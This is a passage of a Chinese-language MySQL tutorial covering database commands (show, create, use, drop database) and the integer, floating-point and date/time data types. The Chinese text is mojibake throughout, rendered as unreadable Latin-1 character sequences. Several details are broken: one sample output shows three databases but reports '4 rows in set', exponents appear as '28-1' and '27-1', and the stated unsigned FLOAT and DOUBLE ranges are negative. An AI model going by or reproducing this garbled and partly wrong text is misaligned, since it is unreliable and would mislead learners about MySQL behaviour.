å­—ç¬¦ä¸²ç±»å‹ï¼Œæ•°å­—ã€æ—¥æœŸç­‰ç±»å‹ï¼Œåœ¨åé¢æˆ‘ä»¬ä¼šè¯¦ç»†ä»‹ç»\nçº¦æŸï¼šçº¦æŸä¹Ÿæœ‰å¾ˆå¤šï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå«åšå”¯ä¸€æ€§çº¦æŸï¼Œè¿™ç§çº¦æŸæ·»åŠ åï¼Œè¯¥å­—æ®µçš„æ•°æ®ä¸èƒ½é‡å¤\n2.5.1 æŸ¥çœ‹æ•°æ®åº“ä¸­çš„è¡¨use test1;\n#Expected output:#Database changed\nshow tables;\n#Expected output:#+--------------------+#| Database in test1  |#+--------------------+#| article            |#| res                |#| name               |#+--------------------+#3 rows in set (0.00 sec)\n\n2.6 æ•°æ®åº“æ“ä½œ2.6.1 æ˜¾ç¤ºå½“å‰çš„æ•°æ®åº“show databases;\n#Expected output:#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| sys                |#+--------------------+#4 rows in set (0.01 sec)\n2.6.2 åˆ›å»ºæ•°æ®åº“create database [name];\n#Expected output:#Query OK, 1 row affected (0.01 sec)mysql&gt; show databases;#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| performance_schema |#| sys                |#| name               |#+--------------------+#5 rows in set (0.00 sec)\nè¯­æ³•ï¼š\nCREATE DATABASE [IF NOT EXISTS] db_name [create_specification] [,create_specification] ...]create_specification:\t[DEFAULT] CHARACTER SET charset_name\t[DEFAULT] COLLATE collation_name#å¤§å†™çš„è¡¨ç¤ºæ˜¯å…³é”®å­—#[]æ˜¯å¯é€‰é¡¹#CHARACTER SETï¼šæŒ‡å®šæ•°æ®åº“é‡‡ç”¨çš„å­—ç¬¦é›†#COLLATEï¼šæŒ‡å®šæ•°æ®åº“å­—ç¬¦é›†çš„æ ¡éªŒè§„åˆ™\n2.6.3 é€‰ä¸­/ä½¿ç”¨æ•°æ®åº“use [name];\n#Expected output:#Database changed\n2.6.4 åˆ é™¤æ•°æ®åº“drop database [name];\nè¯­æ³•ï¼š\nDROP DATABASE [IF EXISTS] db_name\n#Expected output:#Query OK, 0 row affected (0.00 sec)\n ä¸€æ—¦åˆ é™¤æ•°æ®åº“ï¼Œè¿™é‡Œçš„æ•°æ®é€šè¿‡å¸¸è§„çš„æ‰‹æ®µå°±æ‰¾ä¸å›æ¥äº†ï¼ï¼ï¼æ‰€ä»¥åˆ é™¤æ•°æ®åº“æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„æ“ä½œï¼ï¼åœ¨å·¥ä½œä¸­ï¼Œæ— è®ºå¦‚ä½•éƒ½ä¸è¦ä½¿ç”¨drop databaseæ“ä½œï¼Œå°¤å…¶æ˜¯é’ˆå¯¹çº¿ä¸Šç¯å¢ƒ~\n2.7 æ•°æ®ç±»å‹æ•°æ®ç±»å‹ï¼ˆdata_typeï¼‰æ˜¯æŒ‡ç³»ç»Ÿä¸­æ‰€å…è®¸çš„æ•°æ®çš„ç±»å‹ã€‚æ•°æ®åº“ä¸­çš„æ¯ä¸ªåˆ—éƒ½åº”è¯¥æœ‰é€‚å½“çš„æ•°æ®ç±»å‹ï¼Œç”¨äºé™åˆ¶æˆ–å…è®¸è¯¥åˆ—ä¸­å­˜å‚¨çš„æ•°æ®ã€‚ä¾‹å¦‚ï¼Œåˆ—ä¸­å­˜å‚¨çš„ä¸ºæ•°å­—ï¼Œåˆ™ç›¸åº”çš„æ•°æ®ç±»å‹åº”è¯¥ä¸ºæ•°å€¼ç±»å‹ã€‚\nå¦‚æœä½¿ç”¨é”™è¯¯çš„æ•°æ®ç±»å‹å¯èƒ½ä¼šä¸¥é‡å½±å“åº”ç”¨ç¨‹åºçš„åŠŸèƒ½å’Œæ€§èƒ½ï¼Œæ‰€ä»¥åœ¨è®¾è®¡è¡¨æ—¶ï¼Œåº”è¯¥ç‰¹åˆ«é‡è§†æ•°æ®åˆ—æ‰€ç”¨çš„æ•°æ®ç±»å‹ã€‚æ›´æ”¹åŒ…å«æ•°æ®çš„åˆ—ä¸æ˜¯ä¸€ä»¶å°äº‹ï¼Œè¿™æ ·åšå¯èƒ½ä¼šå¯¼è‡´æ•°æ®ä¸¢å¤±ã€‚å› æ­¤ï¼Œåœ¨åˆ›å»ºè¡¨æ—¶å¿…é¡»ä¸ºæ¯ä¸ªåˆ—è®¾ç½®æ­£ç¡®çš„æ•°æ®ç±»å‹å’Œé•¿åº¦ã€‚\nMySQL çš„æ•°æ®ç±»å‹æœ‰å¤§æ¦‚å¯ä»¥åˆ†ä¸ºæ•´æ•°ç±»å‹ã€æµ®ç‚¹æ•°ç±»å‹å’Œå®šç‚¹æ•°ç±»å‹ã€æ—¥æœŸå’Œæ—¶é—´ç±»å‹ã€å­—ç¬¦ä¸²ç±»å‹ã€äºŒè¿›åˆ¶ç±»å‹ç­‰ã€‚\næ³¨æ„ï¼š æ•´æ•°ç±»å‹å’Œæµ®ç‚¹æ•°ç±»å‹å¯ä»¥ç»Ÿç§°ä¸ºæ•°å€¼æ•°æ®ç±»å‹ã€‚\n\næ•°å€¼ç±»å‹ï¼šæ•´æ•°ç±»å‹åŒ…æ‹¬ TINYINTã€SMALLINTã€MEDIUMINTã€INTã€BIGINTï¼Œæµ®ç‚¹æ•°ç±»å‹åŒ…æ‹¬ FLOAT å’Œ DOUBLEï¼Œå®šç‚¹æ•°ç±»å‹ä¸º DECIMALã€‚\næ—¥æœŸ/æ—¶é—´ç±»å‹ï¼šåŒ…æ‹¬ YEARã€TIMEã€DATEã€DATETIME å’Œ TIMESTAMPã€‚\nå­—ç¬¦ä¸²ç±»å‹ï¼šåŒ…æ‹¬ CHARã€VARCHARã€BINARYã€VARBINARYã€BLOBã€TEXTã€ENUM å’Œ SET ç­‰ã€‚\näºŒè¿›åˆ¶ç±»å‹ï¼šåŒ…æ‹¬ BITã€BINARYã€VARBINARYã€TINYBLOBã€BLOBã€MEDIUMBLOB å’Œ LONGBLOBã€‚\n\n\n2.7.1 æ•°å€¼ç±»å‹æ•´æ•°ç±»å‹MySQL ä¸»è¦æä¾›çš„æ•´æ•°ç±»å‹æœ‰ TINYINTã€SMALLINTã€MEDIUMINTã€INTã€BIGINTï¼Œå…¶å±æ€§å­—æ®µå¯ä»¥æ·»åŠ  AUTO_INCREMENT è‡ªå¢çº¦æŸæ¡ä»¶ã€‚\n\nä»ä¸Šè¡¨ä¸­å¯ä»¥çœ‹åˆ°ï¼Œä¸åŒç±»å‹çš„æ•´æ•°å­˜å‚¨æ‰€éœ€çš„å­—èŠ‚æ•°ä¸ç›¸åŒï¼Œå ç”¨å­—èŠ‚æ•°æœ€å°çš„æ˜¯ TINYINT ç±»å‹ï¼Œå ç”¨å­—èŠ‚æœ€å¤§çš„æ˜¯ BIGINT ç±»å‹ï¼Œå ç”¨çš„å­—èŠ‚è¶Šå¤šçš„ç±»å‹æ‰€èƒ½è¡¨ç¤ºçš„æ•°å€¼èŒƒå›´è¶Šå¤§ã€‚\næ ¹æ®å ç”¨å­—èŠ‚æ•°å¯ä»¥æ±‚å‡ºæ¯ä¸€ç§æ•°æ®ç±»å‹çš„å–å€¼èŒƒå›´ã€‚ä¾‹å¦‚ï¼ŒTINYINT éœ€è¦ 1 ä¸ªå­—èŠ‚ï¼ˆ8bitï¼‰æ¥å­˜å‚¨ï¼Œé‚£ä¹ˆ TINYINT æ— ç¬¦å·æ•°çš„æœ€å¤§å€¼ä¸º 28-1ï¼Œå³ 255ï¼›TINYINT æœ‰ç¬¦å·æ•°çš„æœ€å¤§å€¼ä¸º 27-1ï¼Œå³ 127ã€‚å…¶ä»–ç±»å‹çš„æ•´æ•°çš„å–å€¼èŒƒå›´è®¡ç®—æ–¹æ³•ç›¸åŒï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚\n\næç¤ºï¼š æ˜¾ç¤ºå®½åº¦å’Œæ•°æ®ç±»å‹çš„å–å€¼èŒƒå›´æ˜¯æ— å…³çš„ã€‚æ˜¾ç¤ºå®½åº¦åªæ˜¯æŒ‡æ˜ MySQL æœ€å¤§å¯èƒ½æ˜¾ç¤ºçš„æ•°å­—ä¸ªæ•°ï¼Œæ•°å€¼çš„ä½æ•°å°äºæŒ‡å®šçš„å®½åº¦æ—¶ä¼šç”±ç©ºæ ¼å¡«å……ã€‚å¦‚æœæ’å…¥äº†å¤§äºæ˜¾ç¤ºå®½åº¦çš„å€¼ï¼Œåªè¦è¯¥å€¼ä¸è¶…è¿‡è¯¥ç±»å‹æ•´æ•°çš„å–å€¼èŒƒå›´ï¼Œæ•°å€¼ä¾ç„¶å¯ä»¥æ’å…¥ï¼Œè€Œä¸”èƒ½å¤Ÿæ˜¾ç¤ºå‡ºæ¥ã€‚ä¾‹å¦‚ï¼Œyear å­—æ®µæ’å…¥ 19999ï¼Œå½“ä½¿ç”¨ SELECT æŸ¥è¯¢è¯¥åˆ—å€¼çš„æ—¶å€™ï¼ŒMySQL æ˜¾ç¤ºçš„å°†æ˜¯å®Œæ•´çš„å¸¦æœ‰ 5 ä½æ•°å­—çš„ 19999ï¼Œè€Œä¸æ˜¯ 4 ä½æ•°å­—çš„å€¼ã€‚\nå…¶ä»–æ•´å‹æ•°æ®ç±»å‹ä¹Ÿå¯ä»¥åœ¨å®šä¹‰è¡¨ç»“æ„æ—¶æŒ‡å®šæ‰€éœ€çš„æ˜¾ç¤ºå®½åº¦ï¼Œå¦‚æœä¸æŒ‡å®šï¼Œåˆ™ç³»ç»Ÿä¸ºæ¯ä¸€ç§ç±»å‹æŒ‡å®šé»˜è®¤çš„å®½åº¦å€¼ã€‚\nä¸åŒçš„æ•´æ•°ç±»å‹æœ‰ä¸åŒçš„å–å€¼èŒƒå›´ï¼Œå¹¶ä¸”éœ€è¦ä¸åŒçš„å­˜å‚¨ç©ºé—´ï¼Œå› æ­¤åº”æ ¹æ®å®é™…éœ€è¦é€‰æ‹©æœ€åˆé€‚çš„ç±»å‹ï¼Œè¿™æ ·æœ‰åˆ©äºæé«˜æŸ¥è¯¢çš„æ•ˆç‡å’ŒèŠ‚çœå­˜å‚¨ç©ºé—´ã€‚\næµ®ç‚¹ç±»å‹MySQL ä¸­ä½¿ç”¨æµ®ç‚¹æ•°å’Œå®šç‚¹æ•°æ¥è¡¨ç¤ºå°æ•°ã€‚\næµ®ç‚¹ç±»å‹æœ‰ä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯å•ç²¾åº¦æµ®ç‚¹æ•°ï¼ˆFLOATï¼‰å’ŒåŒç²¾åº¦æµ®ç‚¹æ•°ï¼ˆDOUBLEï¼‰ï¼›å®šç‚¹ç±»å‹åªæœ‰ä¸€ç§ï¼Œå°±æ˜¯ DECIMALã€‚\næµ®ç‚¹ç±»å‹å’Œå®šç‚¹ç±»å‹éƒ½å¯ä»¥ç”¨(M, D)æ¥è¡¨ç¤ºï¼Œå…¶ä¸­ M ç§°ä¸ºç²¾åº¦ï¼Œè¡¨ç¤ºæ€»å…±çš„ä½æ•°ï¼›D ç§°ä¸ºæ ‡åº¦ï¼Œè¡¨ç¤ºå°æ•°çš„ä½æ•°ã€‚\næµ®ç‚¹æ•°ç±»å‹çš„å–å€¼èŒƒå›´ä¸º Mï¼ˆ1ï½255ï¼‰å’Œ Dï¼ˆ1ï½30ï¼Œä¸”ä¸èƒ½å¤§äº M-2ï¼‰ï¼Œåˆ†åˆ«è¡¨ç¤ºæ˜¾ç¤ºå®½åº¦å’Œå°æ•°ä½æ•°ã€‚M å’Œ D åœ¨ FLOAT å’ŒDOUBLE ä¸­æ˜¯å¯é€‰çš„ï¼ŒFLOAT å’Œ DOUBLE ç±»å‹å°†è¢«ä¿å­˜ä¸ºç¡¬ä»¶æ‰€æ”¯æŒçš„æœ€å¤§ç²¾åº¦ã€‚DECIMAL çš„é»˜è®¤ D å€¼ä¸º 0ã€M å€¼ä¸º 10ã€‚\nä¸‹è¡¨ä¸­åˆ—å‡ºäº† MySQL ä¸­çš„å°æ•°ç±»å‹å’Œå­˜å‚¨éœ€æ±‚ã€‚\n\nDECIMAL ç±»å‹ä¸åŒäº FLOAT å’Œ DOUBLEã€‚DOUBLE å®é™…ä¸Šæ˜¯ä»¥å­—ç¬¦ä¸²çš„å½¢å¼å­˜æ”¾çš„ï¼ŒDECIMAL å¯èƒ½çš„æœ€å¤§å–å€¼èŒƒå›´ä¸ DOUBLE ç›¸åŒï¼Œä½†æ˜¯æœ‰æ•ˆçš„å–å€¼èŒƒå›´ç”± M å’Œ D å†³å®šã€‚å¦‚æœæ”¹å˜ M è€Œå›ºå®š Dï¼Œåˆ™å–å€¼èŒƒå›´å°†éš M çš„å˜å¤§è€Œå˜å¤§ã€‚\nä»ä¸Šè¡¨ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒDECIMAL çš„å­˜å‚¨ç©ºé—´å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œè€Œç”±ç²¾åº¦å€¼ M å†³å®šï¼Œå ç”¨ M+2 ä¸ªå­—èŠ‚ã€‚\nFLOAT ç±»å‹çš„å–å€¼èŒƒå›´å¦‚ä¸‹ï¼š\n\næœ‰ç¬¦å·çš„å–å€¼èŒƒå›´ï¼š-3.402823466E+38ï½-1.175494351E-38ã€‚\næ— ç¬¦å·çš„å–å€¼èŒƒå›´ï¼š0 å’Œ -1.175494351E-38ï½-3.402823466E+38ã€‚\n\nDOUBLE ç±»å‹çš„å–å€¼èŒƒå›´å¦‚ä¸‹ï¼š\n\næœ‰ç¬¦å·çš„å–å€¼èŒƒå›´ï¼š-1.7976931348623157E+308ï½-2.2250738585072014E-308ã€‚\næ— ç¬¦å·çš„å–å€¼èŒƒå›´ï¼š0 å’Œ -2.2250738585072014E-308ï½-1.7976931348623157E+308ã€‚\n\næç¤ºï¼š\n\nä¸è®ºæ˜¯å®šç‚¹è¿˜æ˜¯æµ®ç‚¹ç±»å‹ï¼Œå¦‚æœç”¨æˆ·æŒ‡å®šçš„ç²¾åº¦è¶…å‡ºç²¾åº¦èŒƒå›´ï¼Œåˆ™ä¼šå››èˆäº”å…¥è¿›è¡Œå¤„ç†ã€‚\nFLOAT å’Œ DOUBLE åœ¨ä¸æŒ‡å®šç²¾åº¦æ—¶ï¼Œé»˜è®¤ä¼šæŒ‰ç…§å®é™…çš„ç²¾åº¦ï¼ˆç”±è®¡ç®—æœºç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿå†³å®šï¼‰ï¼ŒDECIMAL å¦‚æœä¸æŒ‡å®šç²¾åº¦ï¼Œé»˜è®¤ä¸ºï¼ˆ10ï¼Œ0ï¼‰ã€‚\næµ®ç‚¹æ•°ç›¸å¯¹äºå®šç‚¹æ•°çš„ä¼˜ç‚¹æ˜¯åœ¨é•¿åº¦ä¸€å®šçš„æƒ…å†µä¸‹ï¼Œæµ®ç‚¹æ•°èƒ½å¤Ÿè¡¨ç¤ºæ›´å¤§çš„èŒƒå›´ï¼›ç¼ºç‚¹æ˜¯ä¼šå¼•èµ·ç²¾åº¦é—®é¢˜ã€‚\nåœ¨ MySQL ä¸­ï¼Œå®šç‚¹æ•°ä»¥å­—ç¬¦ä¸²å½¢å¼å­˜å‚¨ï¼Œåœ¨å¯¹ç²¾åº¦è¦æ±‚æ¯”è¾ƒé«˜çš„æ—¶å€™ï¼ˆå¦‚è´§å¸ã€ç§‘å­¦æ•°æ®ï¼‰ï¼Œä½¿ç”¨ DECIMAL çš„ç±»å‹æ¯”è¾ƒå¥½\nå¦å¤–ä¸¤ä¸ªæµ®ç‚¹æ•°è¿›è¡Œå‡æ³•å’Œæ¯”è¾ƒè¿ç®—æ—¶ä¹Ÿå®¹æ˜“å‡ºé—®é¢˜ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨æµ®ç‚¹æ•°æ—¶éœ€è¦æ³¨æ„ï¼Œå¹¶å°½é‡é¿å…åšæµ®ç‚¹æ•°æ¯”è¾ƒã€‚\n\n\n2.7.2 æ—¥æœŸå’Œæ—¶é—´ç±»å‹MySQL ä¸­æœ‰å¤šå¤„è¡¨ç¤ºæ—¥æœŸçš„æ•°æ®ç±»å‹ï¼šYEARã€TIMEã€DATEã€DTAETIMEã€TIMESTAMPã€‚å½“åªè®°å½•å¹´ä¿¡æ¯çš„æ—¶å€™ï¼Œå¯ä»¥åªä½¿ç”¨ YEAR ç±»å‹ã€‚\næ¯ä¸€ä¸ªç±»å‹éƒ½æœ‰åˆæ³•çš„å–å€¼èŒƒå›´ï¼Œå½“æŒ‡å®šç¡®å®šä¸åˆæ³•çš„å€¼æ—¶ï¼Œç³»ç»Ÿå°†â€œé›¶â€å€¼æ’å…¥æ•°æ®åº“ä¸­ã€‚\n\nYEAR ç±»å‹YEAR ç±»å‹æ˜¯ä¸€ä¸ªå•å­—èŠ‚ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºå¹´ï¼Œåœ¨å­˜å‚¨æ—¶åªéœ€è¦ 1 ä¸ªå­—èŠ‚ã€‚å¯ä»¥ä½¿ç”¨å„ç§æ ¼å¼æŒ‡å®š YEARï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\nä»¥ 4 ä½å­—ç¬¦ä¸²æˆ–è€… 4 ä½æ•°å­—æ ¼å¼è¡¨ç¤ºçš„ YEARï¼ŒèŒƒå›´ä¸º â€˜1901â€™ï½â€™2155â€™ã€‚è¾“å…¥æ ¼å¼ä¸º â€˜YYYYâ€™ æˆ–è€… YYYYï¼Œä¾‹å¦‚ï¼Œè¾“å…¥ â€˜2010â€™ æˆ– 2010ï¼Œæ’å…¥æ•°æ®åº“çš„å€¼å‡ä¸º 2010ã€‚\nä»¥ 2 ä½å­—ç¬¦ä¸²æ ¼å¼è¡¨ç¤ºçš„ YEARï¼ŒèŒƒå›´ä¸º â€˜00â€™ åˆ° â€˜99â€™ã€‚â€™00â€™ï½â€™69â€™ å’Œ â€˜70â€™ï½â€™99â€™ èŒƒå›´çš„å€¼åˆ†åˆ«è¢«è½¬æ¢ä¸º 2000ï½2069 å’Œ 1970ï½1999 èŒƒå›´çš„ YEAR å€¼ã€‚â€™0â€™ ä¸ â€˜00â€™ çš„ä½œç”¨ç›¸åŒã€‚æ’å…¥è¶…è¿‡å–å€¼èŒƒå›´çš„å€¼å°†è¢«è½¬æ¢ä¸º 2000ã€‚\nä»¥ 2 ä½æ•°å­—è¡¨ç¤ºçš„ YEARï¼ŒèŒƒå›´ä¸º 1ï½99ã€‚1ï½99 å’Œ 70ï½99 èŒƒå›´çš„å€¼åˆ†åˆ«è¢«è½¬æ¢ä¸º 2001ï½2069 å’Œ 1970ï½1999 èŒƒå›´çš„ YEAR å€¼ã€‚æ³¨æ„ï¼Œåœ¨è¿™é‡Œ 0 å€¼å°†è¢«è½¬æ¢ä¸º 0000ï¼Œè€Œä¸æ˜¯ 2000ã€‚\n\næç¤ºï¼š ä¸¤ä½æ•´æ•°èŒƒå›´ä¸ä¸¤ä½å­—ç¬¦ä¸²èŒƒå›´ç¨æœ‰ä¸åŒã€‚ä¾‹å¦‚ï¼Œæ’å…¥ 3000 å¹´ï¼Œè¯»è€…å¯èƒ½ä¼šä½¿ç”¨æ•°å­—æ ¼å¼çš„ 0 è¡¨ç¤º YEARï¼Œå®é™…ä¸Šï¼Œæ’å…¥æ•°æ®åº“çš„å€¼ä¸º 0000ï¼Œè€Œä¸æ˜¯æ‰€å¸Œæœ›çš„ 3000ã€‚åªæœ‰ä½¿ç”¨å­—ç¬¦ä¸²æ ¼å¼çš„ â€˜0â€™ æˆ– â€˜00â€™ï¼Œæ‰å¯ä»¥è¢«æ­£ç¡®è§£é‡Šä¸º 3000ï¼Œéæ³• YEARå€¼å°†è¢«è½¬æ¢ä¸º 0000ã€‚\nTIME ç±»å‹TIME ç±»å‹ç”¨äºåªéœ€è¦æ—¶é—´ä¿¡æ¯çš„å€¼ï¼Œåœ¨å­˜å‚¨æ—¶éœ€è¦ 3 ä¸ªå­—èŠ‚ã€‚æ ¼å¼ä¸º HH:MM:SSã€‚HH è¡¨ç¤ºå°æ—¶ï¼ŒMM è¡¨ç¤ºåˆ†é’Ÿï¼ŒSS è¡¨ç¤ºç§’ã€‚\nTIME ç±»å‹çš„å–å€¼èŒƒå›´ä¸º -838ï¼š59ï¼š59ï½838ï¼š59ï¼š59ï¼Œå°æ—¶éƒ¨åˆ†å¦‚æ­¤å¤§çš„åŸå› æ˜¯ TIME ç±»å‹ä¸ä»…å¯ä»¥ç”¨äºè¡¨ç¤ºä¸€å¤©çš„æ—¶é—´ï¼ˆå¿…é¡»å°äº 24 å°æ—¶ï¼‰ï¼Œè¿˜å¯èƒ½æ˜¯æŸä¸ªäº‹ä»¶è¿‡å»çš„æ—¶é—´æˆ–ä¸¤ä¸ªäº‹ä»¶ä¹‹é—´çš„æ—¶é—´é—´éš”ï¼ˆå¯å¤§äº 24 å°æ—¶ï¼Œæˆ–è€…ç”šè‡³ä¸ºè´Ÿï¼‰ã€‚\nå¯ä»¥ä½¿ç”¨å„ç§æ ¼å¼æŒ‡å®š TIME å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\n\nâ€˜D HHï¼šMMï¼šSSâ€˜ æ ¼å¼çš„å­—ç¬¦ä¸²ã€‚è¿˜å¯ä»¥ä½¿ç”¨è¿™äº›â€œéä¸¥æ ¼â€çš„è¯­æ³•ï¼šâ€™HHï¼šMMï¼šSSâ€˜ã€â€™HHï¼šMMâ€˜ã€â€™D HHâ€˜ æˆ– â€˜SSâ€˜ã€‚è¿™é‡Œçš„ D è¡¨ç¤ºæ—¥ï¼Œå¯ä»¥å– 0ï½34 ä¹‹é—´çš„å€¼ã€‚åœ¨æ’å…¥æ•°æ®åº“æ—¶ï¼ŒD è¢«è½¬æ¢ä¸ºå°æ—¶ä¿å­˜ï¼Œæ ¼å¼ä¸º â€œD*24+HHâ€ã€‚\nâ€˜HHMMSSâ€˜ æ ¼å¼ã€æ²¡æœ‰é—´éš”ç¬¦çš„å­—ç¬¦ä¸²æˆ–è€… HHMMSS æ ¼å¼çš„æ•°å€¼ï¼Œå‡å®šæ˜¯æœ‰æ„ä¹‰çš„æ—¶é—´ã€‚ä¾‹å¦‚ï¼Œâ€™101112â€™ è¢«ç†è§£ä¸ºâ€™10ï¼š11ï¼š12â€™ï¼Œä½†æ˜¯ â€˜106112â€™ æ˜¯ä¸åˆæ³•çš„ï¼ˆå®ƒæœ‰ä¸€ä¸ªæ²¡æœ‰æ„ä¹‰çš„åˆ†é’Ÿéƒ¨åˆ†ï¼‰ï¼Œåœ¨å­˜å‚¨æ—¶å°†å˜ä¸º 00ï¼š00ï¼š00ã€‚\n\nä¸º TIME åˆ—åˆ†é…ç®€å†™å€¼æ—¶åº”æ³¨æ„ï¼š\n\nå¦‚æœæ²¡æœ‰å†’å·ï¼ŒMySQL è§£é‡Šå€¼æ—¶ï¼Œå‡å®šæœ€å³è¾¹çš„ä¸¤ä½è¡¨ç¤ºç§’ã€‚ï¼ˆMySQL è§£é‡Š TIME å€¼ä¸ºè¿‡å»çš„æ—¶é—´è€Œä¸æ˜¯å½“å‰çš„æ—¶é—´ï¼‰ã€‚ä¾‹å¦‚ï¼Œè¯»è€…å¯èƒ½è®¤ä¸º â€˜1112â€™ å’Œ 1112 è¡¨ç¤º 11ï¼š12ï¼š00ï¼ˆå³ 11 ç‚¹è¿‡ 12 åˆ†é’Ÿï¼‰ï¼Œä½†MySQL å°†å®ƒä»¬è§£é‡Šä¸º 00ï¼š11ï¼š12ï¼ˆå³ 11 åˆ† 12 ç§’ï¼‰ã€‚åŒæ · â€˜12â€™ å’Œ 12 è¢«è§£é‡Šä¸º00ï¼š00ï¼š12ã€‚\nç›¸åï¼ŒTIME å€¼ä¸­å¦‚æœä½¿ç”¨å†’å·åˆ™è‚¯å®šè¢«çœ‹ä½œå½“å¤©çš„æ—¶é—´ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œâ€™11ï¼š12â€™ è¡¨ç¤º 11ï¼š12ï¼š00ï¼Œè€Œä¸æ˜¯ 00ï¼š11ï¼š12ã€‚\n\nDATE ç±»å‹DATE ç±»å‹ç”¨äºä»…éœ€è¦æ—¥æœŸå€¼æ—¶ï¼Œæ²¡æœ‰æ—¶é—´éƒ¨åˆ†ï¼Œåœ¨å­˜å‚¨æ—¶éœ€è¦ 3 ä¸ªå­—èŠ‚ã€‚æ—¥æœŸæ ¼å¼ä¸º â€˜YYYY-MM-DDâ€˜ï¼Œå…¶ä¸­ YYYY è¡¨ç¤ºå¹´ï¼ŒMM è¡¨ç¤ºæœˆï¼ŒDD è¡¨ç¤ºæ—¥ã€‚\nåœ¨ç»™ DATE ç±»å‹çš„å­—æ®µèµ‹å€¼æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²ç±»å‹æˆ–è€…æ•°å­—ç±»å‹çš„æ•°æ®æ’å…¥ï¼Œåªè¦ç¬¦åˆ DATE çš„æ—¥æœŸæ ¼å¼å³å¯ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š\n\nä»¥ â€˜YYYY-MM-DDâ€˜ æˆ–è€… â€˜YYYYMMDDâ€˜ å­—ç¬¦ä¸­æ ¼å¼è¡¨ç¤ºçš„æ—¥æœŸï¼Œå–å€¼èŒƒå›´ä¸º â€˜1000-01-01â€™ï½â€™9999-12-3â€™ã€‚ä¾‹å¦‚ï¼Œè¾“å…¥ â€˜2015-12-31â€™ æˆ–è€… â€˜20151231â€™ï¼Œæ’å…¥æ•°æ®åº“çš„æ—¥æœŸä¸º2015-12-31ã€‚\nä»¥ â€˜YY-MM-DDâ€˜ æˆ–è€… â€˜YYMMDDâ€˜ å­—ç¬¦ä¸²æ ¼å¼è¡¨ç¤ºæ—¥æœŸï¼Œåœ¨è¿™é‡ŒYYè¡¨ç¤ºä¸¤ä½çš„å¹´å€¼ã€‚MySQL è§£é‡Šä¸¤ä½å¹´å€¼çš„è§„åˆ™ï¼šâ€™00ï½69â€™ èŒƒå›´çš„å¹´å€¼è½¬æ¢ä¸º â€˜2000-2069â€™ï¼Œâ€™70-99â€™ èŒƒå›´çš„å¹´å€¼è½¬æ¢ä¸º â€˜1970ï½1999â€™ã€‚ä¾‹å¦‚ï¼Œè¾“å…¥ â€˜15-12-31â€™ï¼Œæ’å…¥æ•°æ®åº“çš„æ—¥æœŸä¸º 2015-12-31ï¼›è¾“å…¥ â€˜991231â€™ï¼Œæ’å…¥æ•°æ®åº“çš„æ—¥æœŸä¸º 1999-12-31ã€‚\nä»¥YYMMDD æ•°å­—æ ¼å¼è¡¨ç¤ºçš„æ—¥æœŸï¼Œä¸å‰é¢ç›¸ä¼¼ï¼Œ00~69 èŒƒå›´çš„å¹´å€¼è½¬æ¢ä¸º 2000ï½2069ï¼Œ80ï½99 èŒƒå›´çš„å¹´å€¼è½¬æ¢ä¸º 1980ï½1999ã€‚ä¾‹å¦‚ï¼Œè¾“å…¥ 151231ï¼Œæ’å…¥æ•°æ®åº“çš„æ—¥æœŸä¸º 2015-12-31ï¼Œè¾“å…¥ 991231ï¼Œæ’å…¥æ•°æ®åº“çš„æ—¥æœŸä¸º 1999-12-31ã€‚\nä½¿ç”¨ CURRENT_DATE æˆ–è€… NOW()ï¼Œæ’å…¥å½“å‰ç³»ç»Ÿæ—¥æœŸã€‚\n\nMySQL å…è®¸â€œä¸ä¸¥æ ¼â€è¯­æ³•ï¼š ä»»ä½•æ ‡ç‚¹ç¬¦å·éƒ½å¯ä»¥ç”¨ä½œæ—¥æœŸéƒ¨åˆ†ä¹‹é—´çš„é—´éš”ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™98-11-31â€™ã€â€™98.11.31â€™ã€â€™98/11/31â€™å’Œâ€™98@11@31â€™ æ˜¯ç­‰ä»·çš„ï¼Œè¿™äº›å€¼ä¹Ÿå¯ä»¥æ­£ç¡®åœ°æ’å…¥æ•°æ®åº“ã€‚\nDATETIME ç±»å‹DATETIME ç±»å‹ç”¨äºéœ€è¦åŒæ—¶åŒ…å«æ—¥æœŸå’Œæ—¶é—´ä¿¡æ¯çš„å€¼ï¼Œåœ¨å­˜å‚¨æ—¶éœ€è¦ 8 ä¸ªå­—èŠ‚ã€‚æ—¥æœŸæ ¼å¼ä¸º â€˜YYYY-MM-DD HHï¼šMMï¼šSSâ€˜ï¼Œå…¶ä¸­ YYYY è¡¨ç¤ºå¹´ï¼ŒMM è¡¨ç¤ºæœˆï¼ŒDD è¡¨ç¤ºæ—¥ï¼ŒHH è¡¨ç¤ºå°æ—¶ï¼ŒMM è¡¨ç¤ºåˆ†é’Ÿï¼ŒSS è¡¨ç¤ºç§’ã€‚\nåœ¨ç»™ DATETIME ç±»å‹çš„å­—æ®µèµ‹å€¼æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²ç±»å‹æˆ–è€…æ•°å­—ç±»å‹çš„æ•°æ®æ’å…¥ï¼Œåªè¦ç¬¦åˆ DATETIME çš„æ—¥æœŸæ ¼å¼å³å¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\n\nä»¥ â€˜YYYY-MM-DD HHï¼šMMï¼šSSâ€˜ æˆ–è€… â€˜YYYYMMDDHHMMSSâ€˜ å­—ç¬¦ä¸²æ ¼å¼è¡¨ç¤ºçš„æ—¥æœŸï¼Œå–å€¼èŒƒå›´ä¸º â€˜1000-01-01 00ï¼š00ï¼š00â€™ï½â€™9999-12-3 23ï¼š59ï¼š59â€™ã€‚ä¾‹å¦‚ï¼Œè¾“å…¥ â€˜2014-12-31 05ï¼š05ï¼š05â€™ æˆ–è€… â€˜20141231050505â€™ï¼Œæ’å…¥æ•°æ®åº“çš„ 